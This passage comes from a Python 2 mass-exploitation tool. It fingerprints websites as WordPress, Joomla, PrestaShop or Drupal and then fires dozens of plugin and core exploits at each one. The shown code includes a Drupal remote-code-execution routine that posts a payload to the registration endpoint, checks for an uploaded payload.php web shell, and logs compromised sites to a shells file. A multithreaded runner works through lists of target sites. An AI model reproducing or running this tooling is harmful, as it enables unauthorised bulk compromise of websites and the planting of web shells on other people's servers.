            url = u + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
            r = requests.post(url, data=payload, verify=False, headers=headers)
            if 'Select Your File :' in requests.get(u+'/payload.php', verify=False, headers=headers).text:
                print color.GREEN+'[Drupal Rce]-Vulun ', u + '/payload.php'
                with open('results/shells.txt', mode='a') as d:
                    d.write(u + '/payload.php\n')
            else:
                print color.RED+u, " -> Not exploitable"
        except:
            pass
    def check(site):
        headers = {'User-Agent': 'Mozilla 5.0'}
        requests.urllib3.disable_warnings()
        try : 
            w = requests.get(site, verify=False, headers=headers)
            if 'wordpress' in w.content or '/wp-content/' in w.content :
                save = open('tmp/wordpress.txt', 'a')
                save.write(site+'\n')
                print color.PURPLE+site,'-WordPress'
                print color.GREEN+"[+]Gravity Forms"
                gravity(site)
                print color.GREEN+"[+]Revslider"
                revslider(site)
                print color.GREEN+"[+]ShowBiz"
                showbiz(site)
                print color.GREEN+"[+]AddBlockUrl"
                addblockurl(site)
                print color.GREEN+"[+]CherryPlugin"
                cherry(site)
                print color.GREEN+"[+]Wysija"
                wysija(site)
                print color.GREEN+"[+]FormCaft"
                formcaft(site)
                print color.GREEN+"[+]Revslider Get Config"
                revslidergetconfig(site)
                print color.GREEN+"[+]Work The Flow File Upload"
                wtffu(site)
                print color.GREEN+"[+]SimpleAdsManager"
                simpleadsmanager(site)
                print color.GREEN+"[+]DownloadsManager"
                downloadsmanager(site)
                print color.GREEN+"[+]Inboundio-Marketing"
                inboundiomarketing(site)
                print color.GREEN+"[+]ZoomSound"
                zoomsound(site)
                print color.GREEN+"[+]ReflexGaller"
                reflexgallery(site)
                print color.GREEN+"[+]SexyContactForm"
                sexycontacoform(site)
                print color.GREEN+"[+]PhPCalendarEvenet"
                phpeventcalendar(site)
                print color.GREEN+"[+]WPShop"
            elif 'Joomla' in w.content :
                save = open('tmp/joomla.txt', 'a')
                save.write(site+'\n')
                print color.PURPLE+site,"-Joomla"
                print color.GREEN+"[+]JCE IMAGE"
                jce(site)
                print color.GREEN+"[+]JCE SHELL"
                jceshell(site)
                print color.GREEN+"[+]ALBERGHI"
                alberghi(site)
                print color.GREEN+"[+]RCE"
                rce(site)
                print color.GREEN+"[+]AdsManager Shell"
                adsmanager(site)
                print color.GREEN+"[+]AdsManager Index"
                adsindex(site)
                print color.GREEN+"[+]Com_Fabrik Index"
                fabric_index(site)
                print color.GREEN+"[+]Com_MyBlog"
                myblog(site)
                print color.GREEN+"[+]Cckjseblod"
                cckjseblod(site)
                print color.GREEN+"[+]MacGallery"
                macgallery(site)
                print color.GREEN+"[+]HdfVPlayer"
                hdflvplayer(site)
                print color.GREEN+"[+]ModSimpleFileUpload"
                modsimplefileupload(site)
            elif 'PrestaShop' in w.content :
                print color.PURPLE+site,"-PrestaShop"
                save = open('tmp/prestashop.txt', 'a')
                save.write(site+'\n')
                print color.GREEN+"[+]ColumnAdverts"
                columnadverts(site)
                print color.GREEN+"[+]SoopaMobile"
                soopamobile(site)
                print color.GREEN+"[+]SoopaBanner"
                soopabanners(site)
                print color.GREEN+"[+]VTermSlideShow"
                vtermslideshow(site)
                print color.GREEN+"[+]SimpleSlideShow"
                simpleslideshow(site)
                print color.GREEN+"[+]ProductPageAdverts"
                productpageadverts(site)
                print color.GREEN+"[+]HomePageAdvertise"
                homepageadvertise(site)
                print color.GREEN+"[+]HomePageAdvertise2"
                homepageadvertise2(site)
                print color.GREEN+"[+]JRO_HomePageAdvertise"
                jro_homepageadvertise(site)
                print color.GREEN+"[+]AttributeWizardPro"
                attributewizardpro(site)
                print color.GREEN+"[+]OneAttributeWizardPro"
                oneattributewizardpro(site)
                print color.GREEN+"[+]AttributeWizardProOld"
                attributewizardproOLD(site)
                print color.GREEN+"[+]AttributeWizardPro_X"
                attributewizardpro_x(site)
                print color.GREEN+"[+]VideoStab"
                videostab(site)
                print color.GREEN+"[+]Wg24ThemeAdministration"
                wg24themeadministration(site)
            elif 'Drupal' in w.content or 'drupal' in w.content:
                print color.PURPLE+site,"-Drupal"
                save = open('tmp/drupal.txt', 'a')
                save.write(site+'\n')
                print color.GREEN+"[+]Drupal Add Admin"
                drupal(site)
                print color.GREEN+"[+]Drupal Rce"
                drugeddon(site)
            else:
                print color.RED+site,"[Unkown]"
        except :
            pass
    site = []
    def clear():
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    def normal(lista):
        file = open(lista).readlines()
        if (len(file) > 0):
            for zeb in file:
                nouna = zeb.rstrip()
                check(nouna)

    class color:
       PURPLE = '\033[95m'
       CYAN = '\033[96m'
       DARKCYAN = '\033[36m'
       BLUE = '\033[94m'
       GREEN = '\033[92m'
       YELLOW = '\033[93m'
       RED = '\033[91m'
       BOLD = '\033[1m'
       UNDERLINE = '\033[4m'
       END = '\033[0m'
    clear()
    try:
        target = [i.strip() for i in open(sys.argv[4], mode='r').readlines()]
    except IndexError:
        pass
    if '-t' in sys.argv :
        try : 
            mp = Pool(int(sys.argv[2]))
            mp.map(check, target)
            mp.close()
            mp.join()
        except :
            pass
    elif '-u' in sys.argv :
        normal(sys.argv[2])
    else:
        print logo
        print "Usage : MultiThread : "+sys.argv[0]+" -t thteads -u lists"
        print "Usage : SingleThread : "+sys.argv[0]+" -u lists"




if os.name == 'nt':
    windows()
else:
    linux()
